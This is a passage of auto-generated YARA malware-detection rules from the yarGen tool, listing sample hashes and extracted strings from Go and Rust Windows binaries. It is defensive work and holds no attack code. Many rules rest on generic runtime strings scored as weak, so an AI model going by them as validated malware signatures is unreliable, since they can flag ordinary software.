      $s9 = "fmt.(*pp).handleMethods.func2" fullword ascii /* score: '4.00'*/
      $s10 = "crypto/md5.init.0" fullword ascii /* score: '4.00'*/
      $s11 = "fmt.(*pp).handleMethods.func4" fullword ascii /* score: '4.00'*/
      $s12 = "fmt.(*pp).handleMethods.func1" fullword ascii /* score: '4.00'*/
      $s13 = "sync.(*Once).doSlow.func1" fullword ascii /* score: '4.00'*/
      $s14 = "(devel)" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c54674_47 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
   strings:
      $s1 = "fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '18.00'*/
      $s2 = "attempt to divide by zero" fullword ascii /* score: '13.00'*/
      $s3 = "fatal runtime error: an irrecoverable error occurred while synchronizing threads" fullword ascii /* score: '10.00'*/
      $s4 = "mainfatal runtime error: unwrap failed: CString::new(\"main\") = " fullword ascii /* score: '10.00'*/
      $s5 = "fatal runtime error: assertion failed: thread_info.is_none()" fullword ascii /* score: '10.00'*/
      $s6 = "library\\std\\src\\sys_common\\once\\queue.rs" fullword ascii /* score: '7.00'*/
      $s7 = "a formatting trait implementation returned an errorlibrary\\alloc\\src\\fmt.rs" fullword ascii /* score: '7.00'*/
      $s8 = "internal error: entered unreachable code" fullword ascii /* score: '7.00'*/
      $s9 = "cannot access a Thread Local Storage value during or after destructionlibrary\\std\\src\\thread\\local.rs" fullword ascii /* score: '6.00'*/
      $s10 = "library\\std\\src\\sys\\windows\\os.rs" fullword ascii /* score: '4.00'*/
      $s11 = " []_^A\\A^A_" fullword ascii /* score: '1.00'*/
      $s12 = "X[]_^A^A_" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_48 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "sched={pc: but progSize  nmidlelocked= on zero Value out of range  procedure in  to finalizer  untyped args -thread limit" fullword ascii /* score: '11.00'*/
      $s2 = "25046467781066894531258881784197" ascii /* score: '3.00'*/
      $s3 = "ead298023223876953125A" ascii /* score: '1.00'*/
      $s4 = "e1455191522836685180664062572759576141834259033203125B" ascii /* score: '1.00'*/
      $s5 = "28421709430404007434844970703125Ce" ascii /* score: '1.00'*/
      $s6 = "14901161193847656257450580596923828125A" ascii /* score: '1.00'*/
      $s7 = "152587890625762939453125B" ascii /* score: '1.00'*/
      $s8 = "2220446049250313080847263336181640625" ascii /* score: '1.00'*/
      $s9 = "ed11368683772161602973937988281255684341886080801486968994140625Ce" ascii /* score: '1.00'*/
      $s10 = "c116415321826934814453125582076609134674072265625A" ascii /* score: '1.00'*/
      $s11 = "7434844970703125Ce" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f_eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d_49 {
   meta:
      description = "mw - from files 108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f"
      hash2 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = ",,,,,,/" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = ",,,,,,,,,,,,/" fullword ascii /* score: '1.00'*/
      $s3 = "|,,,,,(" fullword ascii /* score: '1.00'*/
      $s4 = ">m+`P!pnZ" fullword ascii /* score: '1.00'*/
      $s5 = ",,,,,/" fullword ascii /* score: '1.00'*/
      $s6 = "<W>z~Z\"Ws" fullword ascii /* score: '1.00'*/
      $s7 = ",,,,,,,,/" fullword ascii /* score: '1.00'*/
      $s8 = "d;yK;&" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c34_50 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "runtime.panicunsafeslicenilptr" fullword ascii /* score: '10.00'*/
      $s2 = "reflect.flag.panicNotMap" fullword ascii /* score: '7.00'*/
      $s3 = "reflect.Value.lenNonSlice" fullword ascii /* score: '7.00'*/
      $s4 = "reflect.valueMethodName" fullword ascii /* score: '7.00'*/
      $s5 = "reflect.Value.bytesSlow" fullword ascii /* score: '7.00'*/
      $s6 = "reflect.Value.panicNotBool" fullword ascii /* score: '7.00'*/
      $s7 = "reflect.Value.stringNonString" fullword ascii /* score: '7.00'*/
      $s8 = "reflect.Value.typeSlow" fullword ascii /* score: '7.00'*/
      $s9 = "xZwoz<y(z" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_51 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash4 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "SetIterKey" fullword ascii /* score: '7.00'*/
      $s2 = "FieldByIndexErr" fullword ascii /* score: '4.00'*/
      $s3 = "SetIterValue" fullword ascii /* score: '4.00'*/
      $s4 = "UnsafePointer" fullword ascii /* score: '4.00'*/
      $s5 = "CanComplex" fullword ascii /* score: '3.00'*/
      $s6 = "P8H9H@" fullword ascii /* score: '1.00'*/
      $s7 = "CanFloat" fullword ascii /* score: '0.00'*/
      $s8 = "CanUint" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_52 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $s1 = "net.IPMask.Size" fullword ascii /* score: '7.00'*/
      $s2 = "crypto/sha1.(*digest).BlockSize" fullword ascii /* score: '4.00'*/
      $s3 = "crypto/md5.(*digest).BlockSize" fullword ascii /* score: '4.00'*/
      $s4 = "l$8M9,$" fullword ascii /* score: '1.00'*/
      $s5 = "3552713678800500929355621337890625" ascii /* score: '1.00'*/
      $s6 = "476837158203125" ascii /* score: '1.00'*/
      $s7 = "35527136788" ascii /* score: '1.00'*/
      $s8 = "Precedence" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c54674_53 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      hash3 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash4 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $s1 = " []_^A^" fullword ascii /* score: '1.00'*/
      $s2 = "([_^A\\A^A_" fullword ascii /* score: '1.00'*/
      $s3 = "([_^A^" fullword ascii /* score: '1.00'*/
      $s4 = " [_^A^A_" fullword ascii /* score: '1.00'*/
      $s5 = "([]_^A\\A]A^A_" fullword ascii /* score: '1.00'*/
      $s6 = "8[]_^A\\A]A^A_" fullword ascii /* score: '1.00'*/
      $s7 = "0[_^A^A_" fullword ascii /* score: '1.00'*/
      $s8 = "([]_^A^A_" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( all of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c54674_54 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641, d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      hash3 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash4 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      hash5 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      hash6 = "d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d"
   strings:
      $s1 = "AWAVATVWSH" fullword ascii /* score: '6.50'*/
      $s2 = "AVVWUSH" fullword ascii /* score: '6.50'*/
      $s3 = "AWAVAUATVWUSH" fullword ascii /* score: '6.50'*/
      $s4 = "AWAVVWSH" fullword ascii /* score: '6.50'*/
      $s5 = "AWAVAUATVWSH" fullword ascii /* score: '6.50'*/
      $s6 = "AWAVVWUSH" fullword ascii /* score: '6.50'*/
      $s7 = "AVVWSH" fullword ascii /* score: '3.50'*/
      $s8 = "8[_^A^" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( all of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_55 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "tLIcC<L" fullword ascii /* score: '4.00'*/
      $s2 = "tKIc@<H" fullword ascii /* score: '4.00'*/
      $s3 = "tFIcH<L" fullword ascii /* score: '4.00'*/
      $s4 = "tQHcJ<H" fullword ascii /* score: '4.00'*/
      $s5 = "8MZtXH" fullword ascii /* score: '1.00'*/
      $s6 = ":MZu]H" fullword ascii /* score: '1.00'*/
      $s7 = "H3t$(D" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d_56 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "*func() (driver.Value, error)" fullword ascii /* score: '10.00'*/
      $s2 = "*driver.Valuer" fullword ascii /* score: '7.00'*/
      $s3 = "database/sql/driver.init" fullword ascii /* score: '7.00'*/
      $s4 = "eWorld: inconsistent mp->nextptoo many Additionals to pack (>65535)too many Authorities to pack (>65535)value too large for defi" ascii /* score: '7.00'*/
      $s5 = "*driver.Value" fullword ascii /* score: '7.00'*/
      $s6 = "database/sql/driver" fullword ascii /* score: '7.00'*/
      $s7 = "dle failedruntime: allocation size out of rangeruntime: unexpected SPWRITE function setprofilebucket: profile already setstartTh" ascii /* score: '6.00'*/
      $s8 = "277555756156289135105907917022705078125" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

rule _790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c34_57 {
   meta:
      description = "mw - from files 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash2 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "internal/testlog.PanicOnExit0" fullword ascii /* score: '9.00'*/
      $s2 = "internal/testlog.PanicOnExit0.func1" fullword ascii /* score: '9.00'*/
      $s3 = "crypto/md5.(*digest).Sum" fullword ascii /* score: '7.00'*/
      $s4 = "os.runtime_beforeExit" fullword ascii /* score: '7.00'*/
      $s5 = "crypto/md5.(*digest).checkSum" fullword ascii /* score: '4.00'*/
      $s6 = "encoding/base64.(*Encoding).EncodeToString" fullword ascii /* score: '4.00'*/
      $s7 = "encoding/base64.(*Encoding).Encode" fullword ascii /* score: '4.00'*/
      $s8 = "os.Exit" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c34_58 {
   meta:
      description = "mw - from files 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash2 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.convI2I" fullword ascii /* score: '10.00'*/
      $s2 = "fmt.Fprintln" fullword ascii /* score: '7.00'*/
      $s3 = "internal/poll.(*FD).Read.func2" fullword ascii /* score: '7.00'*/
      $s4 = "internal/poll.(*FD).Read.func3" fullword ascii /* score: '7.00'*/
      $s5 = "internal/poll.(*FD).Write.func2" fullword ascii /* score: '4.00'*/
      $s6 = "fmt.(*pp).doPrintln" fullword ascii /* score: '4.00'*/
      $s7 = "internal/poll.(*FD).Write.func3" fullword ascii /* score: '4.00'*/
      $s8 = "crypto/md5.(*digest).Write" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_59 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash3 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
   strings:
      $s1 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '21.00'*/
      $s2 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '18.00'*/
      $s3 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '17.00'*/
      $s4 = " preemptoff= s.elemsize= s.sweepgen= span.limit= span.state= sysmonwait= wbuf1=<nil> wbuf2=<nil>) p->status=, cons/mark -byte li" ascii /* score: '13.00'*/
      $s5 = " preemptoff= s.elemsize= s.sweepgen= span.limit= span.state= sysmonwait= wbuf1=<nil> wbuf2=<nil>) p->status=, cons/mark -byte li" ascii /* score: '13.00'*/
      $s6 = "command-line-arguments" fullword ascii /* score: '12.00'*/
      $s7 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=(unknown), " ascii /* score: '2.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( all of them )
      ) or ( all of them )
}

rule _3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c_9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7b_60 {
   meta:
      description = "mw - from files 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914, b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash2 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      hash3 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
   strings:
      $s1 = "L90u H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = ".?AV_Iostream_error_category2@std@@" fullword ascii /* score: '3.00'*/
      $s3 = "T$ D)s" fullword ascii /* score: '1.00'*/
      $s4 = "tpH91uk" fullword ascii /* score: '1.00'*/
      $s5 = "f9)u:H" fullword ascii /* score: '1.00'*/
      $s6 = "tU;\\$0tH" fullword ascii /* score: '1.00'*/
      $s7 = "taL9Chu" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c_3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357_61 {
   meta:
      description = "mw - from files 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7, 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914, b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985, ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748, f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash2 = "3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7"
      hash3 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      hash4 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash5 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      hash6 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      hash7 = "ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748"
      hash8 = "f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
   strings:
      $s1 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s2 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s3 = "__swift_2" fullword ascii /* score: '4.00'*/
      $s4 = "__swift_1" fullword ascii /* score: '4.00'*/
      $s5 = "api-ms-" fullword wide /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7_5a268b88ea8b1cad2a07b43e855af3ad4f5e9fb0e1aef21ab4d2a66306_62 {
   meta:
      description = "mw - from files 3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7, 5a268b88ea8b1cad2a07b43e855af3ad4f5e9fb0e1aef21ab4d2a66306c3dca4, 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7"
      hash2 = "5a268b88ea8b1cad2a07b43e855af3ad4f5e9fb0e1aef21ab4d2a66306c3dca4"
      hash3 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
   strings:
      $s1 = "008deee3d3f0" ascii /* score: '4.00'*/
      $s2 = "      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" fullword ascii /* score: '2.00'*/
      $s3 = "      <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" fullword ascii /* score: '2.00'*/
      $s4 = "      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" fullword ascii /* score: '2.00'*/
      $s5 = "a2440225f93a" ascii /* score: '1.00'*/
      $s6 = "d69d4a4a6e38" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_63 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $s1 = "able long paths; proceeding in fixup mode" fullword ascii /* score: '4.00'*/
      $s2 = "TB0\"/A" fullword ascii /* score: '1.00'*/
      $s3 = "TK0\"/8" fullword ascii /* score: '1.00'*/
      $s4 = "H9{8uC" fullword ascii /* score: '1.00'*/
      $s5 = "go1.18.3" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c34_64 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
